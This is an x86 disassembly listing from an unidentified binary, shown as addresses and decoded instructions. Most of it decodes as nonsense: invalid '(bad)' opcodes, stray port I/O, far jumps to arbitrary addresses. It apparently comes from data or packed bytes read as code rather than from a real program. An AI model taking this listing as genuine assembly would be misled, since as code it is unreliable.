  41708c:	or     BYTE PTR [esi+ebx*4],0xd4
  417090:	mov    gs,WORD PTR [eax-0x7b]
  417093:	(bad)  
  417094:	leave  
  417095:	cmp    dl,bh
  417097:	sbb    bl,BYTE PTR [eax+eax*2]
  41709a:	sbb    BYTE PTR [esi],al
  41709c:	das    
  41709d:	(bad)  
  41709e:	(bad)  
  41709f:	ret    
  4170a0:	xchg   ecx,eax
  4170a1:	pop    esi
  4170a2:	jecxz  0x417081
  4170a4:	dec    eax
  4170a5:	mov    BYTE PTR [eax],bl
  4170a7:	dec    esi
  4170a8:	dec    ebx
  4170a9:	xor    eax,0xb50793a2
  4170ae:	repz and eax,0x609da859
  4170b4:	fadd   QWORD PTR [ecx+edi*2]
  4170b7:	mov    esp,0x9d349448
  4170bc:	les    eax,FWORD PTR [ecx-0x261cc7ac]
  4170c2:	mov    dh,0x7c
  4170c4:	mov    edx,0xeb30644b
  4170c9:	cmp    BYTE PTR [edi+0xc],bh
  4170cc:	cmc    
  4170cd:	fcom   QWORD PTR [edi+0x52]
  4170d0:	jmp    0x41709f
  4170d2:	pop    edx
  4170d3:	test   ah,ah
  4170d5:	neg    BYTE PTR [ecx-0x34]
  4170d8:	jge    0x417115
  4170da:	push   ebp
  4170db:	push   ds
  4170dc:	mov    ds:0x928bb945,al
  4170e1:	mov    eax,0x41f6ed96
  4170e6:	jmp    0x41713a
  4170e8:	call   0xdff1:0x5dcacfee
  4170ef:	fimul  DWORD PTR [ebp+0x0]
  4170f2:	mov    al,0x80
  4170f4:	out    dx,al
  4170f5:	in     al,0xc3
  4170f7:	adc    eax,0xd6a2c897
  4170fc:	fidivr DWORD PTR [ebp-0x2]
  4170ff:	fs mov ebp,0x224a29f2
  417105:	inc    esp
  417106:	ja     0x417186
  417108:	pop    es
  417109:	mov    eax,0x4c964b3
  41710e:	jmp    0x4170f6
  417110:	ins    BYTE PTR es:[edi],dx
  417111:	int    0x47
  417113:	pop    edi
  417114:	mov    dh,0xc6
  417116:	mov    dl,0xa6
  417118:	mov    dh,BYTE PTR [ebx-0x74]
  41711b:	mov    esp,0xa23ed662
  417120:	push   ebp
  417121:	std    
  417122:	ror    DWORD PTR [esi+ebx*8+0x452c3f26],1
  417129:	sub    ch,al
  41712b:	loope  0x4171ab
  41712d:	dec    edi
  41712e:	and    bh,cl
  417130:	data16 ror BYTE PTR [eax-0x2d79070f],1
  417137:	jo     0x41719d
  417139:	pusha  
  41713a:	push   esp
  41713b:	clc    
  41713c:	test   BYTE PTR [ebx+0x65718b4b],bl
  417142:	dec    eax
  417143:	popf   
  417144:	mov    ah,0xce
  417146:	cli    
  417147:	call   0xac175e80
  41714c:	xor    eax,0xb532786f
  417151:	or     al,0xa
  417153:	push   ebx
  417154:	xchg   ebp,eax
  417155:	stos   DWORD PTR es:[edi],eax
  417156:	sar    DWORD PTR [ebp+0x41],1
  417159:	mov    ebp,0x1f028cda
  41715e:	jle    0x4170f2
  417160:	leave  
  417161:	sub    eax,0x96b43dfb
  417166:	inc    edx
  417167:	ret    0xe41b
  41716a:	mov    dl,0x5f
  41716c:	push   ebp
  41716d:	xor    al,0x7c
  41716f:	mov    bh,0x9
  417171:	mov    ch,BYTE PTR [ebp+0x409dfd2b]
  417177:	push   0x38
  417179:	inc    edi
  41717a:	ins    BYTE PTR es:[edi],dx
  41717b:	sahf   
  41717c:	jl     0x417100
  41717e:	or     esi,esp
  417180:	jl     0x41711d
  417182:	daa    
  417183:	aaa    
  417184:	cmp    dl,ah
  417186:	jb     0x417167
  417188:	mov    cl,0x51
  41718a:	and    DWORD PTR [esi],esp
  41718c:	or     ebx,0x2a
  41718f:	add    bh,BYTE PTR [esi-0x68125b05]
  417195:	inc    esi
  417196:	pop    edi
  417197:	inc    eax
  417198:	rcl    dh,cl
  41719a:	push   eax
  41719b:	das    
  41719c:	xor    esp,DWORD PTR [esp+edi*4+0x40cace86]
  4171a3:	mov    eax,0x27914e23
  4171a8:	int3   
  4171a9:	sub    ebx,esi
  4171ab:	push   esi
  4171ac:	xchg   edi,eax
  4171ad:	lods   al,BYTE PTR ds:[esi]
  4171ae:	imul   BYTE PTR [edi-0x5e94b0dc]
  4171b4:	mov    ah,0xcc
  4171b6:	mov    ds:0x4c8fa5f2,al
  4171bb:	pop    esi
  4171bc:	push   cs
  4171bd:	cmp    dl,cl
  4171bf:	dec    edx
  4171c0:	cmp    DWORD PTR [esi-0x21],0xffffffea
  4171c4:	stos   BYTE PTR es:[edi],al
  4171c5:	cmp    cl,BYTE PTR [edx-0x17]
  4171c8:	xor    dl,BYTE PTR [eax+0x62]
  4171cb:	push   ecx
  4171cc:	jle    0x417205
  4171ce:	pop    ecx
  4171cf:	imul   ebp,DWORD PTR [ebp-0x26],0xfd5fb2e9
  4171d6:	mov    esp,0x2cb82eef
  4171db:	dec    edx
  4171dc:	add    eax,0x20a2d13c
  4171e1:	cmp    eax,0xd78af89a
  4171e6:	add    eax,0x5fc7bb53
  4171eb:	xchg   DWORD PTR ds:[esi-0x5b],ecx
  4171ef:	jbe    0x417208
  4171f1:	mov    edi,0x6aece280
  4171f6:	outs   dx,DWORD PTR ds:[esi]
  4171f7:	fstp   QWORD PTR [edx+0x31]
  4171fa:	or     bh,ah
  4171fc:	push   ds
  4171fd:	jno    0x4171ad
  4171ff:	into   
  417200:	cmp    al,0xb4
  417202:	jl     0x41721b
  417204:	adc    DWORD PTR [esi+0xf4ccce3],ebp
  41720a:	mov    ebp,0x709a22f5
  41720f:	lods   al,BYTE PTR ds:[esi]
  417210:	int3   
  417211:	xor    al,0xed
  417213:	aad    0xe2
  417215:	mov    esi,0x529edfcf
  41721a:	test   BYTE PTR ds:0xf3f14f1f,ah
  417220:	jo     0x4171ad
  417222:	jo     0x417266
  417224:	mov    ch,0x8c
  417226:	inc    ebx
  417227:	ror    DWORD PTR [edi],1
  417229:	inc    ax
  41722b:	xlat   BYTE PTR ds:[ebx]
  41722c:	dec    ebp
  41722d:	call   0xb955:0x24f6811b
  417234:	cmc    
  417235:	(bad)  
  417236:	rcr    DWORD PTR [eax+0x28],0xc6
  41723a:	push   edx
  41723b:	xchg   esp,eax
  41723c:	mov    DWORD PTR [edx+0x43],ecx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	and    DWORD PTR [eax+0x2670dbb5],0x7eb9707f
  41725e:	jo     0x4172d0
  417260:	in     eax,dx
  417261:	or     bh,BYTE PTR ds:0x321727c7
  417267:	call   0xd950c4bf
  41726c:	cdq    
  41726d:	das    
  41726e:	jb     0x417264
  417270:	lods   eax,DWORD PTR ds:[esi]
  417271:	(bad)  
  417272:	jle    0x417258
  417274:	stos   DWORD PTR es:[edi],eax
  417275:	mov    bl,0x21
  417277:	cli    
  417278:	gs out dx,al
  41727a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41727b:	stc    
  41727c:	xor    eax,ebx
  41727e:	xor    BYTE PTR ss:[ebx-0x6bfd7d33],al
  417285:	clc    
  417286:	in     al,0x10
  417288:	push   cs
  417289:	push   edx
  41728a:	sub    al,0xf6
  41728c:	push   ebp
  41728d:	inc    edi
  41728e:	xor    eax,DWORD PTR [eax+0x58]
  417291:	jb     0x41722e
  417293:	adc    eax,0x530cab93
  417298:	push   ebx
  417299:	mov    bl,BYTE PTR [esi+ebp*1]
  41729c:	and    DWORD PTR [ebx],ebp
  41729e:	jg     0x4172ed
  4172a0:	imul   esi,esi,0xffffffed
  4172a3:	bound  edi,QWORD PTR [esi]
  4172a5:	jmp    0xe8a6dabf
  4172aa:	mov    esp,0x9719c0a7
  4172af:	push   ebp
  4172b0:	dec    esp
  4172b1:	sub    al,0x91
  4172b3:	js     0x417269
  4172b5:	icebp  
  4172b6:	push   cs
  4172b7:	sahf   
  4172b8:	mov    bl,0x9a
  4172ba:	adc    bl,BYTE PTR [edx+edx*4-0x2e0b8a01]
  4172c1:	lock lock sar esp,0x47
  4172c6:	push   ecx
  4172c7:	push   ecx
  4172c8:	cdq    
  4172c9:	(bad)  
  4172ca:	outs   dx,DWORD PTR ds:[esi]
  4172cb:	iret   
  4172cc:	sbb    al,0x25
  4172ce:	push   esi
  4172cf:	mov    edx,0x96d35f36
  4172d4:	imul   ebx,DWORD PTR [edi-0x7a],0xcc949598
  4172db:	cld    
  4172dc:	ins    DWORD PTR es:[edi],dx
  4172dd:	inc    edi
  4172de:	ret    
  4172df:	hlt    
  4172e0:	icebp  
  4172e1:	int    0x75
  4172e3:	repz sub BYTE PTR ds:[esi-0x4c02c177],dl
  4172eb:	mov    ds:0xdc65f252,al
  4172f0:	inc    ebx
  4172f1:	stos   BYTE PTR es:[edi],al
  4172f2:	push   esp
  4172f3:	jmp    0xce0b801c
  4172f8:	aam    0x9b
  4172fa:	(bad)  
  4172fb:	iret   
  4172fc:	xchg   ecx,eax
  4172fd:	xor    al,BYTE PTR [ebx+ebp*2+0x3002529]
  417304:	into   
  417305:	mov    eax,0x992b5c3b
  41730a:	fcomp  QWORD PTR [ebx]
  41730c:	cmp    esi,ebp
  41730e:	les    ecx,FWORD PTR es:[esi+0xc]
  417312:	gs jmp 0x80cc:0xdc735cf6
  41731a:	cmp    bh,BYTE PTR [ecx]
  41731c:	stos   DWORD PTR es:[edi],eax
  41731d:	popf   
  41731e:	sbb    edx,DWORD PTR [eax-0x23992ee1]
  417324:	call   0x1d25:0x428109ee
  41732b:	jmp    0x417358
  41732d:	dec    BYTE PTR [ecx-0x5e]
  417330:	aaa    
  417331:	mov    esp,0x258c05bd
  417336:	sar    DWORD PTR [esi+eax*2-0x4725b08d],0x61
  41733e:	push   ecx
  41733f:	xor    DWORD PTR [esi-0x14],ecx
  417342:	and    ah,BYTE PTR [esi+ebx*8-0x2f9dfaa]
  417349:	repnz into 
  41734b:	mov    bl,0x13
  41734d:	inc    eax
  41734e:	mov    cl,0xe9
  417350:	mov    al,0xec
  417352:	in     al,0x86
  417354:	shr    BYTE PTR [ecx-0x358ebd4d],cl
  41735a:	clc    
  41735b:	cli    
  41735c:	sub    al,0x2d
  41735e:	fiadd  WORD PTR [ecx]
  417360:	push   0x60
  417362:	loope  0x4173a4
  417364:	jae    0x417326
  417366:	in     eax,dx
  417367:	pop    ds
  417368:	fbstp  TBYTE PTR [ecx-0x47dfb93c]
  41736e:	sub    eax,esp
  417370:	out    dx,eax
  417371:	call   0xc405:0xd2fc414d
  417378:	jne    0x4173e9
  41737a:	call   0xf90c:0x9bf68db3
  417381:	xchg   bl,al
  417383:	in     al,dx
  417384:	xor    eax,0x8ad8e27b
  417389:	test   BYTE PTR [eax+0x44],ah
  41738c:	nop
  41738d:	mov    ah,0x31
  41738f:	jmp    0x4173a0
  417391:	mov    ebx,0xce3bf84
  417396:	mov    ds:0x6760e4fa,al
  41739b:	fistp  QWORD PTR [edi-0x7c721709]
  4173a1:	pop    eax
  4173a2:	jae    0x417366
  4173a4:	ret    0x18d
  4173a7:	adc    al,BYTE PTR [ecx-0x4d5cf9c2]
  4173ad:	inc    edi
  4173ae:	cli    
  4173af:	call   DWORD PTR [edx]
  4173b1:	add    edi,DWORD PTR [esi-0x38f37ca0]
  4173b7:	sub    ebx,DWORD PTR [eax+edx*8-0x27]
  4173bb:	mov    cs,esp
  4173bd:	lods   al,BYTE PTR ds:[esi]
  4173be:	or     DWORD PTR [ebx+esi*2],edi
  4173c1:	lock push cs
  4173c3:	mov    al,ds:0xbd7a7133
  4173c8:	arpl   WORD PTR [edx+edx*1+0xfe47b4a],si
  4173cf:	btr    eax,ecx
  4173d2:	lds    edi,FWORD PTR ds:0x6b75d4e6
  4173d8:	and    al,bl
  4173da:	rcr    DWORD PTR [ecx+0x28],1
  4173dd:	das    
  4173de:	sbb    ecx,esp
  4173e0:	xchg   esp,eax
  4173e1:	jne    0x4173b8
  4173e3:	or     al,0x1
  4173e5:	in     al,0x48
  4173e7:	sub    DWORD PTR [eax+0x4f419701],ebp
  4173ed:	push   ebx
  4173ee:	mov    DWORD PTR [edx-0x6f],ebx
  4173f1:	aam    0x44
  4173f3:	xchg   ebx,eax
  4173f4:	pop    edi
  4173f5:	psubd  mm6,QWORD PTR [esi-0x7b7ff33b]
  4173fc:	mov    ebx,0xf707897a
  417401:	mov    edi,0x3439dc5b
  417406:	retf   
  417407:	lds    ebx,FWORD PTR [ebx-0x2c]
  41740a:	sbb    bl,al
  41740c:	jno    0x41742a
  41740e:	mov    ah,0xab
  417410:	inc    edi
  417411:	fisubr WORD PTR [ebp-0x2d]
  417414:	jmp    0xcfa0:0xd116106c
  41741b:	iret   
  41741c:	ror    BYTE PTR [edi+0x5ff97a5b],0x9
  417423:	sub    al,0x4c
  417425:	popf   
  417426:	fld    TBYTE PTR [esi+edi*2+0x66cdbe13]
  41742d:	ret    0xee1f
  417430:	js     0x41744e
  417432:	imul   BYTE PTR [eax]
  417434:	lds    ecx,FWORD PTR [edx-0x69]
  417437:	popa   
  417438:	mov    bh,0x21
  41743a:	and    BYTE PTR ds:[ebp-0x2b],cl
  41743e:	loopne 0x4174ac
  417440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417441:	test   BYTE PTR [ebx+0x7d],ch
  417444:	add    ebx,ebp
  417446:	fdivr  QWORD PTR ss:[ebx-0x3908e740]
  41744d:	pusha  
  41744e:	jl     0x417409
  417450:	aas    
  417451:	fnstcw WORD PTR ds:0x9feccbb3
  417457:	(bad)  
  417458:	pop    esi
  417459:	js     0x4173eb
  41745b:	xchg   ebp,eax
  41745c:	ss stos DWORD PTR es:[edi],eax
  41745e:	outs   dx,BYTE PTR ds:[esi]
  41745f:	jmp    0xc91a0c2a
  417464:	dec    ebx
  417465:	loopne 0x41743c
  417467:	dec    esp
  417468:	arpl   WORD PTR [eax-0x26],cx
  41746b:	rol    edi,0x68
  41746e:	jmp    0x5aa8369
  417473:	jmp    0x4bf9fcff
  417478:	fstp   DWORD PTR [ecx]
  41747a:	add    edi,DWORD PTR cs:[ebp+0x8]
  41747e:	out    dx,al
  41747f:	leave  
  417480:	arpl   WORD PTR [ecx+0x283f8d09],di
  417486:	lea    edx,[esi]
  417488:	(bad)  
  417489:	xor    DWORD PTR [edi+edi*1],edx
  41748c:	fsub   QWORD PTR [ecx]
  41748e:	popa   
  41748f:	popf   
  417490:	inc    edi
  417491:	scas   al,BYTE PTR es:[edi]
  417492:	aad    0x4a
  417494:	adc    BYTE PTR [ecx-0xaf306fd],bh
  41749a:	jo     0x41744f
  41749c:	push   esp
  41749d:	cmc    
  41749e:	cli    
  41749f:	ror    BYTE PTR [eax-0x7dd1e8],1
  4174a5:	dec    eax
  4174a6:	ss jae 0x417490
  4174a9:	pusha  
  4174aa:	scas   eax,DWORD PTR es:[edi]
  4174ab:	mov    bl,0xf5
  4174ad:	je     0x4174a7
  4174af:	loope  0x417435
  4174b1:	rcr    BYTE PTR [edx+ebx*4-0x58],1
  4174b5:	aam    0x86
  4174b7:	add    bh,BYTE PTR [ecx+0x13]
  4174ba:	cs and dl,al
  4174bd:	lock nop
  4174bf:	jl     0x4174d7
  4174c1:	inc    ecx
  4174c2:	cmp    eax,0xe8945d6b
  4174c7:	(bad)  
  4174c8:	in     eax,0x18
  4174ca:	cwde   
  4174cb:	fimul  DWORD PTR [ebp+edi*1+0x6f]
  4174cf:	sbb    ch,0x1d
  4174d2:	loope  0x41748e
  4174d4:	outs   dx,DWORD PTR ds:[esi]
  4174d5:	cmc    
  4174d6:	pop    es
  4174d7:	ret    0xc915
  4174da:	adc    eax,0x30f3504b
  4174df:	mov    cl,0xd7
  4174e1:	in     al,dx
  4174e2:	pop    ds
  4174e3:	int    0xde
  4174e5:	sbb    eax,0x9959dd73
  4174ea:	pop    esp
  4174eb:	sbb    eax,0xa237d6be
  4174f0:	adc    dl,BYTE PTR [eax-0x80e869a]
  4174f6:	(bad)  
  4174f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174f8:	mov    cs,ebx
  4174fa:	mov    ecx,ebx
  4174fc:	adc    al,BYTE PTR [ebx-0x60386fda]
  417502:	mov    ds:0x7bf40b99,eax
  417507:	pushf  
  417508:	sbb    ch,BYTE PTR [ecx+eax*1]
  41750b:	sbb    eax,0xf2a21922
  417510:	retf   0x6598
  417513:	outs   dx,BYTE PTR ds:[esi]
  417515:	jns    0x4174f3
  417517:	fild   QWORD PTR [edx+0x3b]
  41751a:	or     eax,0x7d003a7a
  41751f:	pop    es
  417520:	and    eax,0x7ccf07b2
  417525:	test   BYTE PTR [ebx],dl
  417527:	xor    edx,edx
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    eax,edx
  417543:	fld    DWORD PTR [eax+0x7f24b97b]
  417549:	jo     0x417504
  41754b:	jle    0x4175bd
  41754d:	jo     0x4175bb
  41754f:	lock mov ecx,0x8fe9bc64
  417555:	pop    edi
  417556:	xchg   ecx,eax
  417557:	xchg   ebp,eax
  417558:	mov    bl,0x8b
  41755a:	mov    ch,0xa
  41755c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41755d:	pop    ebx
  41755e:	icebp  
  41755f:	in     eax,0x56
  417561:	js     0x4175a9
  417563:	push   esi
  417564:	ss mov dh,0xbc
  417567:	sbb    eax,0x7cb651ab
  41756c:	sub    ch,BYTE PTR [ecx-0x5c63875a]
  417572:	lods   al,BYTE PTR ds:[esi]
  417573:	inc    esp
  417574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417575:	(bad)  
  417577:	pusha  
  417578:	in     eax,0x25
  41757a:	call   0x279d5d71
  41757f:	fisttp DWORD PTR [edx+ebp*4]
  417582:	(bad)  
  417584:	push   esi
  417585:	repz cmp al,0x68
  417588:	jle    0x417564
  41758a:	jb     0x4175a7
  41758c:	fidiv  WORD PTR [ebp-0x34]
  41758f:	xchg   edx,eax
  417590:	and    eax,0x1e5f45ef
  417595:	dec    ecx
  417596:	dec    edx
  417597:	mov    ecx,0x49de017
  41759c:	popa   
  41759d:	(bad)  
  41759e:	mov    ss,WORD PTR [edx]
  4175a0:	mov    DWORD PTR ds:0xe378f290,0x374a1c10
  4175aa:	ss dec ecx
  4175ac:	mov    ebp,0x7972c86
  4175b1:	les    edx,FWORD PTR [esi]
  4175b3:	lods   al,BYTE PTR ds:[esi]
  4175b4:	dec    edi
  4175b5:	push   ebx
  4175b6:	adc    eax,0x749eade2
  4175bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175bc:	and    al,0xa6
  4175be:	jb     0x41755c
  4175c0:	xchg   edi,eax
  4175c1:	pop    esp
  4175c2:	je     0x4175e1
  4175c4:	call   0x5fdedc20
  4175c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175ca:	retf   0x68fe
  4175cd:	nop
  4175ce:	stos   DWORD PTR es:[edi],eax
  4175cf:	in     al,dx
  4175d0:	sbb    BYTE PTR [ecx+0x5b],0xe5
  4175d4:	jp     0x4175ab
  4175d6:	sbb    ebp,DWORD PTR [ebp-0x18fad29e]
  4175dc:	mov    ds:0x96fcb1d,eax
  4175e1:	sbb    eax,0xc2d5b415
  4175e6:	lea    ecx,[esi]
  4175e8:	cmp    ebp,DWORD PTR [eax+0x1026b78e]
  4175ee:	sbb    BYTE PTR [edx],ch
  4175f0:	sub    DWORD PTR ds:0xcb0c7fba,ebp
  4175f6:	push   es
  4175f7:	js     0x417667
  4175f9:	fs pop esp
  4175fb:	call   0x17a4:0xb9c6acf5
  417602:	push   ebx
  417603:	and    dl,dh
  417605:	add    DWORD PTR [edx+0x11fe5ea0],esp
  41760b:	int3   
  41760c:	jne    0x4175a7
  41760e:	aaa    
  41760f:	or     eax,0x573f756c
  417614:	xor    edi,DWORD PTR [ebp-0x53]
  417617:	mov    ?,eax
  417619:	jecxz  0x4175cb
  41761b:	not    DWORD PTR [ecx+ebp*8]
  41761e:	jge    0x4175b9
  417620:	pop    esi
  417621:	sub    BYTE PTR [ecx],0x55
  417624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417625:	adc    dl,BYTE PTR [ebp-0x57]
  417628:	repnz mov bh,0x6a
  41762b:	add    dh,dl
  41762d:	inc    ecx
  41762e:	cmp    al,0x7f
  417630:	in     al,0x7
  417632:	cmp    esi,DWORD PTR [edi]
  417634:	inc    eax
  417635:	lahf   
  417636:	shl    DWORD PTR [edi+0x6b102fd6],1
  41763c:	jmp    0x83c4:0xd5210890
  417643:	mov    ah,0x81
  417645:	jle    0x417611
  417647:	push   ss
  417648:	outs   dx,DWORD PTR ds:[esi]
  417649:	scas   al,BYTE PTR es:[edi]
  41764a:	cdq    
  41764b:	out    dx,eax
  41764c:	mov    ah,0xb6
  41764e:	imul   eax,edx,0x75
  417651:	inc    eax
  417652:	lea    edx,[eax-0x22]
  417655:	outs   dx,BYTE PTR ds:[esi]
  417656:	int3   
  417657:	das    
  417658:	jmp    0xc1168343
  41765d:	iret   
  41765e:	xchg   ebx,eax
  41765f:	mov    dl,0x73
  417661:	xor    DWORD PTR [ecx+0x15f992a8],ebp
  417667:	paddw  mm0,mm7
  41766a:	div    BYTE PTR [ebp+edx*1+0x22afe362]
  417671:	out    0x8c,al
  417673:	ds inc esp
  417675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417676:	gs je  0x417666
  417679:	stos   DWORD PTR es:[edi],eax
  41767a:	mov    al,ds:0x57d8feb9
  41767f:	xor    al,0xc0
  417681:	mov    bh,0x82
  417683:	rcl    DWORD PTR [ebp+0x65575773],0xb9
  41768a:	cmc    
  41768b:	es inc ecx
  41768d:	test   al,0x36
  41768f:	jno    0x417667
  417691:	test   eax,0xc916616
  417697:	fidiv  WORD PTR cs:[esp+edi*4+0x4612fd32]
  41769f:	mov    BYTE PTR [edx],bl
  4176a1:	mov    ah,0x15
  4176a3:	xchg   ebp,eax
  4176a4:	or     esp,eax
  4176a6:	or     ebx,ecx
  4176a8:	or     cl,bh
  4176aa:	dec    ebx
  4176ab:	mov    eax,0xe19df1a4
  4176b0:	jl     0x4176ed
  4176b2:	(bad)  
  4176b3:	(bad)  
  4176b4:	sar    DWORD PTR [edi+0x4e],cl
  4176b7:	or     BYTE PTR [ebx+0x19],dl
  4176ba:	rol    BYTE PTR [edx-0x5b],1
  4176bd:	xchg   edx,eax
  4176be:	or     al,0x62
  4176c0:	xchg   si,ax
  4176c2:	jmp    0x1208:0x8d4aabdc
  4176c9:	rcl    BYTE PTR [ebp+0x22f051ba],cl
  4176cf:	sti    
  4176d0:	mov    al,ds:0xa503b38a
  4176d5:	and    eax,0xef703c58
  4176da:	neg    DWORD PTR [edx+0x274ac25a]
  4176e0:	es clc 
  4176e2:	sti    
  4176e3:	pusha  
  4176e4:	mov    eax,ds:0xb282df47
  4176e9:	enter  0x8974,0xb0
  4176ed:	xchg   edi,eax
  4176ee:	push   ebp
  4176ef:	push   eax
  4176f0:	and    BYTE PTR [ecx+0x18],ch
  4176f3:	inc    ecx
  4176f4:	les    ebp,FWORD PTR ds:[eax]
  4176f7:	xchg   ecx,eax
  4176f8:	(bad)  
  4176f9:	(bad)  
  4176fb:	pop    es
  4176fc:	icebp  
  4176fd:	pushf  
  4176fe:	sub    eax,0xe5ddf5c2
  417703:	push   0x79
  417705:	lods   eax,DWORD PTR ds:[esi]
  417706:	sbb    esp,DWORD PTR [ecx]
  417708:	adc    BYTE PTR [ebx+0x49],0x86
  41770c:	idiv   DWORD PTR [esi+ebx*2]
  41770f:	mov    ah,0xe8
  417711:	dec    edx
  417712:	lds    ecx,FWORD PTR [edi-0x1f]
  417715:	mov    ebp,DWORD PTR [eax+0xf703c0d]
  41771b:	jns    0x417702
  41771d:	(bad)  
  41771e:	pushf  
  41771f:	sub    bl,bh
  417721:	xadd   BYTE PTR [ebx-0x22f1755b],ch
  417728:	xchg   DWORD PTR [edi],edi
  41772a:	inc    ebp
  41772b:	and    BYTE PTR [eax-0x711d623d],al
  417731:	or     al,0xec
  417733:	aad    0x83
  417735:	stos   DWORD PTR es:[edi],eax
  417736:	fwait
  417737:	inc    edx
  417738:	loope  0x4176f0
  41773a:	push   edi
  41773b:	in     eax,0x63
  41773d:	test   DWORD PTR [ebx-0x2d32f77d],edx
  417743:	sahf   
  417744:	fidiv  DWORD PTR [ebx+ecx*1-0x4e]
  417748:	fsubrp st(6),st
  41774a:	jne    0x4176cf
  41774c:	inc    ebp
  41774d:	scas   al,BYTE PTR es:[edi]
  41774e:	fldcw  WORD PTR [edx]
  417750:	sbb    BYTE PTR [esi],cl
  417752:	push   ss
  417753:	sbb    ecx,esp
  417755:	fdivr  QWORD PTR [eax-0x49]
  417758:	add    al,0x6a
  41775a:	aam    0x13
  41775c:	cmp    ch,ah
  41775e:	lods   al,BYTE PTR ds:[esi]
  41775f:	(bad)  
  417760:	cs ds aam 0x8
  417764:	test   BYTE PTR [eax],dl
  417766:	or     edx,edx
  417768:	rcr    BYTE PTR [esi+0x30366bea],1
  41776e:	jne    0x41778f
  417770:	xchg   ebx,eax
  417771:	std    
  417772:	sbb    dl,BYTE PTR [edi+edx*4-0x71]
  417776:	les    edi,FWORD PTR [edx-0x24]
  417779:	jne    0x417778
  41777b:	add    al,0xed
  41777d:	mov    bl,0x17
  41777f:	mov    dl,0x56
  417781:	sbb    dh,BYTE PTR [eax-0x25]
  417784:	repnz push ss
  417786:	cli    
  417787:	dec    ebp
  417788:	xor    al,0xd8
  41778a:	add    DWORD PTR [ebp-0x33a58cb3],esi
  417790:	mov    gs,esp
  417792:	mov    ah,BYTE PTR [ebp-0x4cb4bc1]
  417798:	(bad)  
  417799:	aaa    
  41779a:	cli    
  41779b:	loope  0x417738
  41779d:	cmp    ebp,DWORD PTR [edx+0x733a757c]
  4177a3:	mov    ch,0x97
  4177a5:	xchg   esi,eax
  4177a6:	dec    esi
  4177a7:	and    cl,BYTE PTR [ecx-0x67]
  4177aa:	fadd   st(2),st
  4177ac:	mov    dl,0x99
  4177ae:	pop    ebp
  4177af:	cwde   
  4177b0:	mov    dh,dl
  4177b2:	sbb    ebp,DWORD PTR [edx+0x30dad8a8]
  4177b8:	sahf   
  4177b9:	mov    dl,0xd0
  4177bb:	or     esi,ebx
  4177bd:	(bad)  
  4177bf:	sbb    eax,0x325c0fec
  4177c4:	mov    al,ds:0x97642b00
  4177c9:	push   ebp
  4177ca:	jg     0x41779f
  4177cc:	inc    ecx
  4177cd:	dec    ebp
  4177ce:	adc    ah,BYTE PTR [eax]
  4177d0:	arpl   WORD PTR [edi],dx
  4177d2:	test   BYTE PTR [edx-0x39f8a41b],0xea
  4177d9:	in     eax,0x1e
  4177db:	es repnz pop edx
  4177de:	pop    edx
  4177df:	lods   al,BYTE PTR ds:[esi]
  4177e0:	mov    ?,ecx
  4177e2:	push   ecx
  4177e3:	shl    bl,0x47
  4177e6:	jmp    0x2c8b49ef
  4177eb:	sbb    eax,0x1d85ced2
  4177f0:	outs   dx,BYTE PTR ds:[esi]
  4177f1:	mov    edx,0xe57c9939
  4177f6:	mov    ss,WORD PTR [ecx+0x2c]
  4177f9:	mov    DWORD PTR cs:[esi+0x49],edi
  4177fd:	call   0x33a344c8
  417802:	add    bh,BYTE PTR [edx-0x15b140de]
  417808:	mov    esp,0xe9fb31e1
  41780d:	jae    0x41779b
  41780f:	adc    DWORD PTR [eax-0x3c879248],esp
  417815:	pop    esi
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
